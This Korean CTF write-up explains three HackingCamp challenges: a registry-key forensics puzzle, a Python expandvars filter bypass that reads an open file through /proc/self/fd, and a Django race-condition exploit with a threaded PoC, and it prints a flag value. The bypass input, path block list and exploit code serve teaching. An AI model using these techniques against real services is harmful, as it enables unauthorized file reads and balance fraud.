<p>&#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4; &#xC911; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xC2E4;&#xD589; &#xC635;&#xC158; &#xAD00;&#xB828;  <code>Image File Execution Options</code>&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2023/09/03/l0ch/hackingcamp_review/Untitled%207.png" srcset="/img/loading.gif" alt="Untitled"></p>
<p><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe</code></p>
<p>&#xC704; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xC5D0; &#xB9C8;&#xC9C0;&#xB9C9; fragment&#xAC00; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs mathematica"><span class="hljs-keyword">Image</span> <span class="hljs-keyword">File</span> Execution <span class="hljs-keyword">Options</span>
&#xD574;&#xB2F9; &#xC11C;&#xBE0C; &#xD0A4;&#xC5D0; &#xC2E4;&#xD589;&#xAC00;&#xB2A5; &#xC774;&#xBBF8;&#xC9C0; &#xBC0F; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC874;&#xC7AC; &#xC2DC;, Debugger &#xAC12;&#xC744; &#xCC38;&#xC870;&#xD574; &#xD574;&#xB2F9; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xBA3C;&#xC800; &#xC2E4;&#xD589;.
&#xB514;&#xBC84;&#xAE45;&#xC744; &#xC704;&#xD574; &#xC874;&#xC7AC;&#xD558;&#xB098; &#xC5B4;&#xB5A4; &#xC774;&#xBBF8;&#xC9C0;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xB294;&#xC9C0; &#xAC80;&#xC99D;&#xD560; &#xC218; &#xC5C6;&#xC5B4; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xD2B8;&#xB9AC;&#xAC70;&#xB85C; &#xC545;&#xC6A9;&#xB418;&#xAE30;&#xB3C4; &#xD568;</code></pre>
<p>base64 &#xC778;&#xCF54;&#xB529; &#xB418;&#xC5B4; &#xC788;&#xC73C;&#xB2C8; &#xB514;&#xCF54;&#xB529;&#xD574;&#xC8FC;&#xBA74; &#xB9C8;&#xC9C0;&#xB9C9; fragment&#xAC00; &#xB098;&#xC635;&#xB2C8;&#xB2E4;.</p>
<p>4 : 0d1e872378</p>
<p>1~4&#xC758; Fragment &#xC774;&#xC5B4;&#xBD99;&#xC774;&#xBA74; Flag&#xB97C; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs apache"><span class="hljs-attribute">HCAMP</span>{<span class="hljs-number">7</span>cf<span class="hljs-number">7</span>a<span class="hljs-number">9</span>d<span class="hljs-number">2</span>d<span class="hljs-number">0</span>ac<span class="hljs-number">21</span>fb<span class="hljs-number">716</span>b<span class="hljs-number">1</span>e<span class="hljs-number">032</span>c<span class="hljs-number">79</span>c<span class="hljs-number">40</span>d<span class="hljs-number">1</span>e<span class="hljs-number">872378</span>}</code></pre>
<p>1 solve&#xB85C; &#xB05D;&#xB09C; &#xBB38;&#xC81C;&#xB77C;&#xC11C; CTF &#xC885;&#xB8CC; &#xD6C4; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xD480;&#xC774; &#xBC29;&#xBC95;&#xC744; &#xBC1C;&#xD45C;&#xD558;&#xAE30;&#xB3C4; &#xD588;&#xB294;&#xB370; &#xADF8;&#xB798;&#xB3C4; &#xC26C;&#xC6B4; &#xD3B8;&#xC5D0; &#xC18D;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xC600;&#xB358; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. <del>Windows Heap &#xACF5;&#xBD80;&#xD558;&#xBA74;&#xC11C; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xB4E4;&#xC464;&#xC2E0; &#xAE30;&#xC5B5;&#xC774; &#xC0C8;&#xB85D;&#xC0C8;&#xB85D;</del> </p>
<p>CTF&#xAC00; &#xC624;&#xB79C;&#xB9CC;&#xC774;&#xB77C; &#xAC71;&#xC815;&#xD588;&#xB294;&#xB370; &#xC88B;&#xC740; &#xD300;&#xC6D0;&#xBD84;&#xB4E4;&#xC744; &#xB9CC;&#xB098; 1&#xB4F1;&#xAE4C;&#xC9C0; &#xD588;&#xB124;&#xC694;. &#xC800;&#xB3C4; 1&#xC778;&#xBD84;&#xC740; &#xD574;&#xC11C; &#xB2E4;&#xD589;&#xC785;&#xB2C8;&#xB2E4; &#x314E;&#x314E; </p>
<h2 id="README-syru"><a href="#README-syru" class="headerlink" title="README - syru"></a><strong>README - syru</strong></h2><p>python&#xC758; &#xD568;&#xC218;&#xC778; <code>expandvars</code>&#xC640; &#xB9AC;&#xB205;&#xC2A4;&#xC758; proc file system&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C; &#xC11C;&#xBC84;&#xB97C; &#xAD6C;&#xCD95;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB41C; &#xD30C;&#xC77C;&#xC774; &#xC81C;&#xACF5;&#xB418;&#xC5B4; &#xB354; &#xC218;&#xC6D4;&#xD558;&#xAC8C; &#xD480; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xC6B0;&#xC120; &#xC544;&#xB798; Dockerfile&#xC744; &#xBCF4;&#xBA74; <code>/flag</code> &#xC704;&#xCE58;&#xC5D0; &#xBAA8;&#xB450;&#xAC00; &#xC77D;&#xAE30; &#xAC00;&#xB2A5;&#xD55C; &#xC0C1;&#xD0DC;&#xB85C; flag &#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; <code>CONFIG=/proc</code>&#xC774;&#xB77C;&#xB294; &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xAC00; &#xB4F1;&#xB85D;&#xB418;&#xC5B4;&#xC788;&#xB294; &#xC810;&#xC744; &#xB208;&#xC5EC;&#xACA8; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs shell">FROM python:3.10-slim-buster

ENV DEBIAN_FRONTEND noninteractive

RUN apt-get update &amp;&amp; apt-get install -yqq socat
RUN groupadd -r ctf &amp;&amp; useradd -r -g ctf ctf

RUN echo &quot;flag{fake}&quot; &gt; /flag
RUN chmod 444 /flag

USER ctf
WORKDIR /app
ADD server.py .

ENV CONFIG=&quot;/proc&quot;

CMD socat TCP-L:9999,fork,reuseaddr EXEC:&quot;python server.py&quot;,pty,ctty,stderr,echo=0
</code></pre>
<p>&#xC544;&#xB798; server.py&#xB3C4; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;.</p>
<p>&#xC6B0;&#xC120; main&#xC774; &#xB418;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xBCF4;&#xBA74; flag &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xACE0; <strong>&#xB2EB;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xBA70;</strong> &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC785;&#xB825;&#xC744; <code>filtering</code>&#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xD544;&#xD130;&#xB9C1;&#xC744; &#xC9C4;&#xD589;&#xD55C; &#xB4A4; <code>os.path.expandvars</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xCD5C;&#xC885; file path&#xB97C; &#xB9CC;&#xB4E4;&#xACE0; &#xD574;&#xB2F9; path&#xB97C; &#xC77D;&#xAE30;&#xBAA8;&#xB4DC;&#xB85C; &#xC5F4;&#xC5B4;&#xC11C; &#xB0B4;&#xC6A9;&#xC744; &#xCD9C;&#xB825;&#xD558;&#xBA74;&#xC11C; &#xB05D;&#xB0A9;&#xB2C8;&#xB2E4;.</p>
<p>&#xC774;&#xC81C; &#xC911;&#xC694;&#xD55C; filtering &#xD568;&#xC218;&#xB97C; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;.</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">filtering</span>(<span class="hljs-params">filename</span>):</span>
    FILTER = [<span class="hljs-string">&apos;flag&apos;</span>, <span class="hljs-string">&apos;etc&apos;</span>, <span class="hljs-string">&apos;home&apos;</span>, <span class="hljs-string">&apos;~/&apos;</span>, <span class="hljs-string">&apos;/~&apos;</span>, <span class="hljs-string">&apos;dev&apos;</span>, <span class="hljs-string">&apos;proc&apos;</span>, <span class="hljs-string">&apos;passwd&apos;</span>, <span class="hljs-string">&apos;group&apos;</span>, <span class="hljs-string">&apos;run&apos;</span>, <span class="hljs-string">&apos;usr&apos;</span>, <span class="hljs-string">&apos;var&apos;</span>, <span class="hljs-string">&apos;opt&apos;</span>, <span class="hljs-string">&apos;..&apos;</span>, <span class="hljs-string">&apos;./&apos;</span>]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> FILTER:
        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> filename:
            print(<span class="hljs-string">&apos;Invalid filename&apos;</span>)
            sys.exit(<span class="hljs-number">-1</span>)
</code></pre>
<p>&#xBB38;&#xC81C;&#xC758; filtering &#xD568;&#xC218;&#xB294; lib&#xC744; &#xC81C;&#xC678;&#xD55C; &#xB9AC;&#xB205;&#xC2A4;&#xC758; &#xAE30;&#xBCF8; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC640; flag &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xACE0;&#xB9CC; &#xC788;&#xC73C;&#xBA74; <code>sys.exit(-1)</code>&#xC744; &#xD1B5;&#xD574; &#xBE44;&#xC815;&#xC0C1; &#xC885;&#xB8CC;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. <code>FILTER</code> &#xB9AC;&#xC2A4;&#xD2B8;&#xC5D0; &#xAC78;&#xB9AC;&#xC9C0; &#xC54A;&#xACE0; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC73C;&#xB824;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xD574;&#xC57C; &#xD560;&#xAE4C;&#xC694;? </p>
<p>&#xC55E;&#xC11C; Dockerfile&#xC5D0;&#xC11C; &#xBD10;&#xB454; &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xB97C; &#xC774;&#xC6A9;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. linux&#xC5D0;&#xC11C; proc file system&#xC740; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC758; &#xAC01;&#xC885; &#xC815;&#xBCF4;&#xB97C; &#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xB3C4;&#xC640;&#xC8FC;&#xB294; &#xAC00;&#xC0C1;&#xC758; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC785;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB3C4; &#xC874;&#xC7AC;&#xD558;&#xBA70; &#xC774;&#xB294; <code>/proc/{pid}</code> &#xACBD;&#xB85C;&#xC5D0; &#xC704;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p>&#xC800;&#xD76C;&#xAC00; pid&#xB97C; &#xC54C;&#xC544;&#xB0BC; &#xC218; &#xC5C6;&#xB294;&#xB370; &#xBB34;&#xC791;&#xC815; bruteforce&#xB97C; &#xD574;&#xC57C; &#xD560;&#xAE4C;&#xC694;? &#xBB3C;&#xB860; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xBA87; &#xAC1C; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xAC04;&#xB2E8;&#xD55C; &#xC11C;&#xBE44;&#xC2A4;&#xB77C; &#xAC00;&#xB2A5;&#xC740; &#xD588;&#xACA0;&#xC9C0;&#xB9CC;, &#xB354; &#xD3B8;&#xD558;&#xACE0; &#xD655;&#xC2E4;&#xD55C; &#xBC29;&#xBC95;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC14;&#xB85C; &#xD604;&#xC7AC; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC815;&#xBCF4;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>/proc/self</code>&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC815;&#xBCF4;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xACF3;&#xC740; &#xD655;&#xC778;&#xD588;&#xACE0; flag&#xD30C;&#xC77C;&#xC740; &#xC5B4;&#xB5BB;&#xAC8C; &#xC77D;&#xC5B4;&#xC57C; &#xD560;&#xAE4C;&#xC694;? </p>
<p>&#xC800;&#xD76C;&#xAC00; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB0B4;&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xB54C; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xB294; file descriptor&#xB77C;&#xB294; &#xC815;&#xC218; &#xAC12;&#xC744; &#xD560;&#xB2F9;&#xD574;&#xC8FC;&#xACE0; &#xC774; &#xAC12;&#xC744; &#xD1B5;&#xD574; open&#xB4F1;&#xC758; syscall&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p>&#xC774;&#xC81C; &#xC800;&#xD76C;&#xB294; <code>/proc/{pid}/fd/{fd_value:int}</code> &#xACBD;&#xB85C;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xD1B5;&#xD574; python process&#xC5D0;&#xC11C; &#xC5F4;&#xB824;&#xC788;&#xB294; flag&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p>
<p>flag&#xD30C;&#xC77C;&#xC758; fd&#xAC12;&#xC740; &#xC8FC;&#xC5B4;&#xC9C4; &#xD30C;&#xC77C;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xAC19;&#xC740; &#xD658;&#xACBD;&#xC744; &#xAD6C;&#xC131; &#xD6C4; lsof &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD558;&#xAC70;&#xB098; &#xD574;&#xB2F9; &#xBB38;&#xC81C;&#xC5D0;&#xC11C;&#xB294; &#xD30C;&#xC77C;&#xC774; &#xB9CE;&#xC774; &#xC5F4;&#xB9AC;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; 2 &#xC774;&#xC0C1;&#xC758; &#xAC12;&#xC73C;&#xB85C; bruteforce&#xB97C; &#xD574;&#xB3C4; &#xB429;&#xB2C8;&#xB2E4;.</p>
<ul>
<li><p><code>lsof</code> &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD558;&#xB294; &#xBC95;</p>
<ol>
<li><p>&#xC8FC;&#xC5B4;&#xC9C4; Dockerfile&#xC744; &#xBE4C;&#xB4DC; &#xD6C4; &#xC2E4;&#xD589;</p>
<p> <code>docker build -t readme-hc .</code></p>
<p> <code>docker run -itd -p 9999:9999 readme-hc</code></p>
</li>
<li><p>netcat&#xC744; &#xD1B5;&#xD574; &#xC811;&#xC18D; &#xD6C4; ps, grep&#xC744; &#xD1B5;&#xD574; pid &#xD655;&#xC778;</p>
<p> <code>ps -ef | grep python</code></p>
</li>
<li><p><code>lsof -p {pid}</code>&#xB97C; &#xD1B5;&#xD574; /flag&#xC758; fd &#xD655;&#xC778;</p>
</li>
</ol>
</li>
</ul>
<p><img src="/2023/09/03/l0ch/hackingcamp_review/readme1.png" srcset="/img/loading.gif" alt="readm1"></p>
<p>&#xC774;&#xC81C; &#xB9C8;&#xBB34;&#xB9AC;&#xC785;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2023/09/03/l0ch/hackingcamp_review/readme2.png" srcset="/img/loading.gif" alt="readme2"></p>
<p>&#xC704; API &#xBB38;&#xC11C;&#xB97C; &#xBCF4;&#xBA74; <code>os.path.expandvars</code>&#xB294; &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xC5D0; <code>key=value</code>&#xAC00; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xBA74; <code>$key/path</code>&#xC640; &#xAC19;&#xC740; path string&#xC744; <code>value/path</code>&#xB85C; &#xBC14;&#xAFD4;&#xC8FC;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xC55E;&#xC11C; Dockerfile&#xC744; &#xBD84;&#xC11D;&#xD560; &#xB54C; &#xD655;&#xC778;&#xD588;&#xB358; <code>CONFIG=/proc</code>&#xC744; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>$CONFIG/self/fd/6</code>&#xB97C; &#xC785;&#xB825;&#xD558;&#xC5EC; flag&#xB97C; &#xC77D;&#xC73C;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2023/09/03/l0ch/hackingcamp_review/readme3.png" srcset="/img/loading.gif" alt="readme3"></p>
<h2 id="flag-shop-syru"><a href="#flag-shop-syru" class="headerlink" title="flag shop - syru"></a><strong>flag shop - syru</strong></h2><p>&#xC0AC;&#xC2E4; &#xC800;&#xB294; HCAMP CTF &#xC815;&#xADDC; &#xC2DC;&#xAC04;&#xC758; &#xB300;&#xBD80;&#xBD84;&#xC744; &#xC774; &#xBB38;&#xC81C;&#xC5D0; &#xC3DF;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC55E;&#xC120; sstf&#xC5D0;&#xC11C; django 1day&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xBE44;&#xC2B7;&#xD55C; &#xC720;&#xD615;&#xC758; <a href="https://hackyboiz.github.io/2023/09/01/syru/sstf-web-libreria/">&#xBB38;&#xC81C;</a>&#xB97C; &#xD480;&#xC5B4;&#xBD10;&#xC11C; &#xAF2D; &#xD480;&#xACE0; &#xC2F6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xC544;&#xC27D;&#xAC8C; &#xC9C0;&#xAE08;&#xC740; &#xBB38;&#xC81C; &#xC11C;&#xBC84;&#xB3C4; &#xB2EB;&#xD600;&#xC11C; &#xC874;&#xC7AC;&#xD588;&#xB358; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xC81C;&#xAC00; &#xADF8; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xD47C; &#xBC29;&#xBC95;&#xB9CC; &#xAC04;&#xB2E8;&#xD788; &#xC18C;&#xAC1C;&#xD574;&#xB4DC;&#xB9AC;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>flag shop&#xC740; flag &#xADF8;&#xB9AC;&#xACE0; &#xC5EC;&#xB7EC; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD30C;&#xB294; django framework&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; service&#xC785;&#xB2C8;&#xB2E4;. (<del>&#xD06C;&#xB86C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC2F8;&#xB354;&#xAD70;&#xC694;. &#xC9C4;&#xC9DC; &#xC92C;&#xC73C;&#xBA74; crbug&#xC5D0; &#xC81C;&#xBCF4;&#xD560; &#xBED4;&#x2026;</del>)</p>
<p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC0AC;&#xAE30;&#xB9CC; &#xD560; &#xBFD0; &#xC544;&#xB2C8;&#xB77C; &#xC0C0;&#xB358; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD314; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;. &#xC774; &#xC0AC;&#xACE0;&#xD30C;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; race condition &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OrderAPIView</span>(<span class="hljs-params">APIView</span>):</span>
    permission_classes = []

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self, request, product_id=None, order_id=None</span>):</span>
        ...
        <span class="hljs-comment"># user validation</span>
        balance = request.user.balance
        <span class="hljs-keyword">if</span> balance &lt; product.price:
            <span class="hljs-keyword">return</span> fail(<span class="hljs-string">&quot;Insufficient balance&quot;</span>)

        order = OrderModel.objects.create(
            user=request.user,
            product=product,
            email=email,
        )

        validator = EmailValidator()
        <span class="hljs-keyword">try</span>:
            validator(email)
        <span class="hljs-keyword">except</span> ValidationError:
            order.email = <span class="hljs-literal">None</span>
            order.save()

        request.user.balance -= product.price
        request.user.save()

        <span class="hljs-keyword">return</span> success(OrderSerializer(order).data)

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sell</span>(<span class="hljs-params">APIView</span>):</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self, request, order_id=None</span>):</span>
        <span class="hljs-keyword">try</span>:
            order = OrderModel.objects.get(id=order_id)
        <span class="hljs-keyword">except</span> OrderModel.DoesNotExist:
            <span class="hljs-keyword">return</span> fail(<span class="hljs-string">&quot;Order not found&quot;</span>)

        <span class="hljs-keyword">if</span> order.user != request.user:
            <span class="hljs-keyword">return</span> fail(<span class="hljs-string">&quot;Unauthorized&quot;</span>)

        request.user.balance += order.product.price
        request.user.save()

        order.delete()

        <span class="hljs-keyword">return</span> success({})
</code></pre>
<p>&#xD3C9;&#xBC94;&#xD558;&#xAC8C; &#xC0AC;&#xACE0;&#xD30C;&#xB294; &#xAC83; &#xAC19;&#xC9C0;&#xB9CC; &#xC774; &#xAC00;&#xAC8C;&#xB294; &#xC0C1;&#xB300;&#xBC29;&#xC744; &#xC2E0;&#xB8B0;&#xD558;&#xC5EC; &#xD314; &#xB54C;&#xB294; &#xBB3C;&#xAC74;&#xC744; &#xBA3C;&#xC800; &#xC8FC;&#xACE0; &#xC0B4; &#xB54C;&#xB294; &#xB3C8;&#xC744; &#xBA3C;&#xC800; &#xC90D;&#xB2C8;&#xB2E4;. &#xC800;&#xD76C;&#xB294; &#xC774; &#xBD80;&#xBD84;&#xC744; &#xC774;&#xC81C;&#xBD80;&#xD130; &#xACF5;&#xB7B5;&#xD560; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xD314; &#xB54C;&#xB294; &#xBCF4;&#xC720; &#xC794;&#xC561;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xACE0; &#xC0B4; &#xB54C;&#xB294; &#xC8FC;&#xBB38;&#xC774; &#xC788;&#xC5C8;&#xB358; &#xBB3C;&#xD488;&#xC778;&#xC9C0;&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC548;&#xC804;&#xD574; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. &#xACFC;&#xC5F0; &#xADF8;&#xB7F4;&#xAE4C;&#xC694;?</p>
<p>&#xC774; &#xC11C;&#xBE44;&#xC2A4;&#xB294; db&#xB85C; sqlite3&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs python">DATABASES = {
    <span class="hljs-string">&apos;default&apos;</span>: {
        <span class="hljs-string">&apos;ENGINE&apos;</span>: <span class="hljs-string">&apos;django.db.backends.sqlite3&apos;</span>,
        <span class="hljs-string">&apos;NAME&apos;</span>: BASE_DIR / <span class="hljs-string">&apos;db.sqlite3&apos;</span>,
    }
}
</code></pre>
<p>sqlite3&#xB294; &#xB2E4;&#xC218;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xD558;&#xB098;&#xC758; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xD30C;&#xC77C;&#xC5D0; &#xC77D;&#xACE0; &#xC4F0;&#xB294; &#xAD6C;&#xC870;&#xC778;&#xB370; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xBCF4;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD574; Lock&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC77D;&#xC744; &#xB54C;&#xB294; shared lock&#xC774; &#xAC78;&#xB9AC;&#xBA70; &#xC4F8; &#xB54C;&#xB294; exclusive lock&#xC774; &#xAC78;&#xB9AC;&#xB294;&#xB370; exclusive lock&#xC740; &#xD558;&#xB098;&#xB9CC; &#xD5C8;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xD574;&#xB2F9; &#xC11C;&#xBE44;&#xC2A4;&#xB85C; &#xB3D9;&#xC2DC;&#xC5D0; &#xB4E4;&#xC5B4;&#xC628; &#xAD6C;&#xB9E4; &#xBC0F; &#xD310;&#xB9E4; &#xC694;&#xCCAD;&#xC740; &#xC870;&#xAE08;&#xC758; delay&#xB97C; &#xB450;&#xACE0; &#xCC98;&#xB9AC;&#xB418;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
<p>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xAD6C;&#xB9E4;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD314;&#xC544;&#xC11C; &#xB3C8;&#xC744; &#xC5BB;&#xACE0; &#xAC00;&#xAC8C;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xBCF4;&#xC720; &#xBB3C;&#xD488;&#xC744; &#xC5C6;&#xC560;&#xB294; &#xAC83;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xC5BB;&#xC740; &#xB3C8;&#xC73C;&#xB85C; &#xBB3C;&#xAC74;&#xC744; &#xACC4;&#xC18D; &#xC0AC;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xB420;&#xAE4C;&#xC694;? &#xBB3C;&#xAC74;&#xC744; &#xC0B4; &#xB54C; &#xBCF4;&#xC720;&#xD55C; &#xB3C8;&#xC774; &#xCC28;&#xAC10;&#xB418;&#xB294; &#xC2DC;&#xC810;&#xC740; &#xBCF4;&#xC720; &#xBB3C;&#xD488;&#xC744; &#xC5C6;&#xC560;&#xB294; &#xAC83;&#xC774; &#xCC98;&#xB9AC;&#xB41C; &#xC774;&#xD6C4;&#xC785;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xADF8;&#xC804;&#xC5D0; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; n&#xBC88;&#xC758; &#xAD6C;&#xB9E4;&#xC694;&#xCCAD;&#xC5D0;&#xC11C; &#xC794;&#xC561; &#xAC80;&#xC0AC;&#xB97C; &#xD1B5;&#xACFC;&#xD558;&#xC5EC; &#xBB3C;&#xD488; &#xBA3C;&#xC800; &#xBC1B;&#xB294;&#xB2E4;&#xBA74; m&#xAC1C;&#xC758; &#xBB3C;&#xD488;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (0&lt;m&lt;n)</p>
<p>&#xC774; m&#xAC1C;&#xC758; &#xBB3C;&#xD488;&#xC744; &#xD314;&#xC544; &#xB3C8;&#xC744; &#xB9CE;&#xC774; &#xC5BB;&#xC5B4;&#xC11C; flag&#xB97C; &#xC0AC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs python"><span class="hljs-comment">#PoC</span>
<span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> range(init_idx, init_idx+<span class="hljs-number">20</span>, <span class="hljs-number">1</span>):
    t = threading.Thread(target=sell, args=(idx,))
    t.start()
    t.join()
    t1 = threading.Thread(target=buy , args = ())
    t2 = threading.Thread(target=buy , args = ())
    t1.start()
    t2.start()
    t1.join()
    t2.join()

<span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> range(init_idx, init_idx+<span class="hljs-number">40</span>, <span class="hljs-number">1</span>):
    sell(idx)
buy_flag()
get_flag()
</code></pre>
